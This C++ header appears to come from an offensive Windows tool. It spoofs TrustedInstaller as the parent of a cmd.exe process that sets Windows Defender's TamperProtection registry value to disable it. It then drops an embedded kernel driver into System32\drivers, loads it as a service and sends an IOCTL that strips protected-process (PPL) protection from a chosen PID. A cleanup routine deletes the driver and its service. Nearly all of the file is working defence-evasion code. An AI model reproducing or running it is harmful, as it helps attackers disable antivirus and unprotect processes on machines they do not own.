#pragma once
#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <winternl.h>
#include <ntstatus.h>
#include <map>
#include <string>
#include <shlwapi.h>
#include <stdlib.h>
#include <fltUser.h>
#include <vector>
#include <TlHelp32.h>
#include <processsnapshot.h>
#include <intrin.h>
#include <Dbghelp.h>
#include "TurtleDriver.h"

#define IOCTL_TURTLEDRIVER_TESTER CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,METHOD_NEITHER,FILE_ANY_ACCESS)
#define IOCTL_TURTLEDRIVER_CHANGE_PPL CTL_CODE(FILE_DEVICE_UNKNOWN,0x801,METHOD_NEITHER,FILE_ANY_ACCESS)


// use ntQuerySystemInformation to get parent process info
typedef DWORD(WINAPI* PNTQUERYSYSYTEMINFORMATION)(DWORD info_class, void* out, DWORD size, DWORD* out_size);
PNTQUERYSYSYTEMINFORMATION pNtQuerySystemInformation = (PNTQUERYSYSYTEMINFORMATION)GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtQuerySystemInformation");

typedef DWORD(WINAPI* PNTIMPERSONATETHREAD)(HANDLE ThreadHandle, HANDLE ThreadToImpersonate, PSECURITY_QUALITY_OF_SERVICE SecurityQualityOfService);
PNTIMPERSONATETHREAD pNtImpersonateThread = (PNTIMPERSONATETHREAD)GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtImpersonateThread");


typedef struct _SYSTEM_PROCESS_INFO
{
	ULONG                   NextEntryOffset;
	ULONG                   NumberOfThreads;
	LARGE_INTEGER           Reserved[3];
	LARGE_INTEGER           CreateTime;
	LARGE_INTEGER           UserTime;
	LARGE_INTEGER           KernelTime;
	UNICODE_STRING          ImageName;
	ULONG                   BasePriority;
	HANDLE                  ProcessId;
	HANDLE                  InheritedFromProcessId;
}SYSTEM_PROCESS_INFO, * PSYSTEM_PROCESS_INFO;


struct PS_PROTECTION {
	UCHAR Type : 3;
	UCHAR Audit : 1;
	UCHAR Signer : 4;
};

struct PROCESS_SIGNATURE_PROTECTION {
	UCHAR SignatureLevel;
	UCHAR SectionSignatureLevel;
	PS_PROTECTION Protection;
};

struct ProcessData {
	ULONG ProcessId;
	PROCESS_SIGNATURE_PROTECTION SigProtection;
};

BOOL Error(const char* errorMsg) {
	printf("%s (%u)\n", errorMsg, GetLastError());
	return FALSE;
}


BOOL WindowsCheckPrivilege(const wchar_t* priv) {
	LUID luid;
	PRIVILEGE_SET privSet;
	HANDLE currentProc = GetCurrentProcess();
	HANDLE currentProcToken;
	if (!OpenProcessToken(currentProc, TOKEN_QUERY, &currentProcToken))
		return FALSE;
	if (!LookupPrivilegeValueW(NULL, priv, &luid))
		return Error("Failed to lookup LUID");
	privSet.PrivilegeCount = 1;
	privSet.Control = PRIVILEGE_SET_ALL_NECESSARY;
	privSet.Privilege[0].Luid = luid;
	privSet.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
	BOOL res;
	PrivilegeCheck(currentProcToken, &privSet, &res);
	CloseHandle(currentProcToken);
	CloseHandle(currentProc);
	return res;
}

BOOL WindowsEnablePrivilege(const wchar_t* priv) {
	TOKEN_PRIVILEGES tokenPrivs;
	LUID luid;
	HANDLE currentProc = GetCurrentProcess();
	HANDLE currentProcToken;
	if (!OpenProcessToken(currentProc, TOKEN_ALL_ACCESS, &currentProcToken))
		return Error("Failed to get proc token");
	if (!LookupPrivilegeValue(NULL, priv, &luid))
		return Error("Failed to lookup priv");
	tokenPrivs.PrivilegeCount = 1;
	tokenPrivs.Privileges[0].Luid = luid;
	tokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(currentProcToken, FALSE, &tokenPrivs, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
		return Error("Failed to adjust token");
	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
		return Error("failed to adjust token 2");
	CloseHandle(currentProcToken);
	CloseHandle(currentProc);
	return TRUE;
}

BOOL StartTrustedInstallerService() {
	SC_HANDLE hServiceManager = NULL;
	SC_HANDLE hService = NULL;
	hServiceManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!hServiceManager)
		return Error("Failed to get handle to sc manager");
	hService = OpenServiceA(hServiceManager, "TrustedInstaller", SERVICE_START | SERVICE_QUERY_STATUS);
	if (!hService)
		return Error("Failed to get handle to trusted installer service");
	// check if running
	SERVICE_STATUS status = {};
	if (!QueryServiceStatus(hService, &status))
		return Error("Failed to query trustedinstaller status");
	if (status.dwCurrentState != SERVICE_RUNNING) {
		// start it 
		if (!StartServiceA(hService, 0, NULL))
			return Error("Failed to start trusted installer");
	}
	// else close handles and exit
	CloseServiceHandle(hServiceManager);
	CloseServiceHandle(hService);
	return TRUE;
}

BOOL DisableTamperProtection(int pid, int enable = 0) {
	HANDLE hPrivProc;
	LPCWSTR params;
	hPrivProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_CREATE_PROCESS | PROCESS_VM_READ, FALSE, pid);
	if (hPrivProc == INVALID_HANDLE_VALUE)
		return Error("Failed to get handle to trusted installer");
	STARTUPINFOEXW sinfo = { sizeof(sinfo) };
	PROCESS_INFORMATION pinfo;
	LPPROC_THREAD_ATTRIBUTE_LIST ptList = NULL;
	SIZE_T bytes;
	sinfo.StartupInfo.cb = sizeof(STARTUPINFOEXA);
	InitializeProcThreadAttributeList(NULL, 1, 0, &bytes);
	ptList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(bytes);
	InitializeProcThreadAttributeList(ptList, 1, 0, &bytes);
	UpdateProcThreadAttribute(ptList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hPrivProc, sizeof(HANDLE), NULL, NULL);
	sinfo.lpAttributeList = ptList;
	if (!enable)
		params = L"C:\\Windows\\System32\\cmd.exe /c reg add \"HKLM\\Software\\Microsoft\\Windows Defender\\Features\" /v TamperProtection /t REG_DWORD /d \"0x4\" /f";
	else
		params = L"C:\\Windows\\System32\\cmd.exe /c reg add \"HKLM\\Software\\Microsoft\\Windows Defender\\Features\" /v TamperProtection /t REG_DWORD /d \"0x5\" /f";
	if (!CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", (LPWSTR)params, NULL, NULL, TRUE, CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sinfo.StartupInfo, &pinfo))
		return Error("Failed to disable tamper protection");
	CloseHandle(hPrivProc);
	return TRUE;
}

BOOL DropTurtleDriver() {
	// attempt to write driver to C:\windows\system32\drivers
	HANDLE hDriverFile;
	hDriverFile = CreateFileA("C:\\windows\\System32\\drivers\\turtleDriver.sys", GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDriverFile == INVALID_HANDLE_VALUE)
		return Error("Failed to get handle to driver file being dropped");
	DWORD bytesWritten;
	if (!WriteFile(hDriverFile, turtleDriverBytes, turtleDriverBytesSz, &bytesWritten, NULL))
		return Error("Failed to write driver to disk");
	CloseHandle(hDriverFile);
	//Sleep(5000);
	return TRUE;
}


BOOL LoadTurtleDriver() {
	SC_HANDLE hServiceManager = NULL;
	SC_HANDLE hService = NULL;
	hServiceManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!hServiceManager)
		return Error("Failed to get handle to sc manager");
	hService = OpenServiceA(hServiceManager, "TurtleDriver", SERVICE_START);
	// if service found start service
	if (!hService) {
		printf("::: turtle driver not found creating service :::\n");
	}
	else {
		if (!StartServiceA(hService, 0, NULL))
			return Error("Failed to start turtle driver");
		else
			return TRUE;
	}
	// create turtle driver service
	hService = CreateServiceA(hServiceManager, "TurtleDriver", "TurtleDriver", SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, "C:\\windows\\System32\\drivers\\turtleDriver.sys", NULL, NULL, NULL, NULL, NULL);
	if (!hService)
		return Error("Failed to create turtle driver service");
	if (!StartServiceA(hService, 0, NULL))
		return Error("Failed to start turtleDriver");
	CloseServiceHandle(hServiceManager);
	CloseServiceHandle(hService);
	return TRUE;
}

BOOL DisableProcProtection(int pid) {
	// get handle to driver device object
	HANDLE hDevice = CreateFile(L"\\\\.\\TurtleDriver", GENERIC_WRITE, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
	if (hDevice == INVALID_HANDLE_VALUE)
		return Error("Failed to open driver device");
	ProcessData sentData;
	sentData.ProcessId = pid;
	sentData.SigProtection.SignatureLevel = 0;
	sentData.SigProtection.SectionSignatureLevel = 0;
	sentData.SigProtection.Protection.Type = 0;
	sentData.SigProtection.Protection.Audit = 0;
	sentData.SigProtection.Protection.Signer = 0;
	DWORD returned;
	BOOL success = DeviceIoControl(hDevice, IOCTL_TURTLEDRIVER_CHANGE_PPL, &sentData, sizeof(sentData), nullptr, 0, &returned, nullptr);
	if (success)
		printf("::: Worked! :::\n");
	else
		Error("Failed to disable protection");
	printf("::: process protection disabled on pid -> %lu :::\n", sentData.ProcessId);
	CloseHandle(hDevice);
	return TRUE;
}


BOOL CleanUp(int tspid) {
	printf("::: attempting cleanup :::\n");
	SC_HANDLE hServiceManager = NULL;
	SC_HANDLE hService = NULL;
	hServiceManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!hServiceManager)
		return Error("Failed to get handle to sc manager");
	hService = OpenServiceA(hServiceManager, "TurtleDriver", SERVICE_STOP | DELETE);
	SERVICE_STATUS status = {};
	// if service found stop service then delete
	if (!hService)
		printf("::: Turtle driver service not found.. skipping cleanup :::\n");
	else {
		// stop service
		if (!ControlService(hService, SERVICE_CONTROL_STOP, &status))
			return Error("Failed to stop turtle driver service");
		// delete service
		Sleep(1000);
		if (!DeleteService(hService))
			return Error("Failed to delete turtle driver service");
	}
	CloseServiceHandle(hServiceManager);
	CloseServiceHandle(hService);
	printf("::: Cleaned up turtle driver services :::\n");
	if (!DeleteFileA("C:\\windows\\System32\\drivers\\turtleDriver.sys"))
		return Error("Failed to delete turtle driver binary");
	printf("::: Cleaned up turtle driver binary :::\n");
	// add regisry cleanup like reEnabling tamper protection
	if (!DisableTamperProtection(tspid, 1))
		return Error("Failed to reEnable tamper protection");
	printf("::: Reverted tamper protection :::\n");
	printf("::: Cleanup done :::\n");
	return TRUE;
}

int GetProcRunningAsTrustedInstaller() {
	size_t bufferSize = 102400;
	ULONG ulReturnLength;
	NTSTATUS status;
	int myPid = GetCurrentProcessId();
	int parentPid = -1;
	int parentPidImageSize;
	PVOID buffer = VirtualAlloc(NULL, 1024 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	PSYSTEM_PROCESS_INFO procInfo;
	procInfo = (PSYSTEM_PROCESS_INFO)buffer;
	status = pNtQuerySystemInformation(SystemProcessInformation, procInfo, 1024 * 1024, NULL);
	if (status != STATUS_SUCCESS)
		return Error("Failed to query proc list"); // returns ZERO
	// save into dictionary
	while (procInfo->NextEntryOffset) {
		//get proc info
		procInfo = (PSYSTEM_PROCESS_INFO)((LPBYTE)procInfo + procInfo->NextEntryOffset);
		//open handle to proc if you can
		HANDLE procHandle;
		HANDLE procToken;
		procHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, (int)procInfo->ProcessId);
		// if no handle move to next proccess
		if (procHandle == INVALID_HANDLE_VALUE) {
			continue;
		}
		if (!OpenProcessToken(procHandle, TOKEN_QUERY, &procToken)) {
			continue;
		}
		// if got handle and token get token info to get sid
		TOKEN_OWNER* tokenOwnerBuffer;
		DWORD tokenInfoLength;
		GetTokenInformation(procToken, TokenOwner, NULL, 0, &tokenInfoLength);
		tokenOwnerBuffer = (PTOKEN_OWNER)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, tokenInfoLength);
		if (!GetTokenInformation(procToken, TokenOwner, tokenOwnerBuffer, tokenInfoLength, &tokenInfoLength)) {
			printf("failed at get token info");
		}
		DWORD dwSize = 256;
		char userName[256];
		char userDomain[256];
		SID_NAME_USE sidType;
		// get user from SID if fails move to next process
		if (!LookupAccountSidA(NULL, tokenOwnerBuffer->Owner, userName, &dwSize, userDomain, &dwSize, &sidType)) {
			printf("failed to get sid");
			continue;
		}
		//printf("Image Name: %ws ::: User Name: %s\\%s ::: Pid: %d\n", procInfo->ImageName.Buffer, userDomain, userName, (int)procInfo->ProcessId);
		if (wcsncmp(procInfo->ImageName.Buffer, L"TrustedInstaller.exe", procInfo->ImageName.Length) == 0) {         //|| strncmp(userName,"Administrators",strlen(userName)) == 0 ) {
			printf("Image Name: %ws ::: User Name: %s\\%s ::: Pid: %d\n", procInfo->ImageName.Buffer, userDomain, userName, (int)procInfo->ProcessId);
			int trustedInstallerPID = (int)procInfo->ProcessId;
			CloseHandle(procHandle);
			CloseHandle(procToken);
			return trustedInstallerPID;
		}
	}
	VirtualFree(buffer, 0, MEM_RELEASE);
	return 0;
}
